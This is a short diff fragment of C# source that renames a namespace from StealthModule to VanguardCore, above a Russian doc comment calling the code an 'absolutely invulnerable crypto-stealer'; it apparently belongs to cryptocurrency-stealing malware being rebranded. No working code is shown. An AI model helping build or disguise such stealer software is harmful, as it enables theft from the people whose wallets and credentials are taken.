@@ -9,7 +9,7 @@ using Microsoft.Win32;
 using System.Security.Cryptography;
 using System.Runtime.InteropServices;
 
-namespace StealthModule
+namespace VanguardCore
 {
     /// <summary>
     /// Абсолютно неуязвимый крипто-стиллер
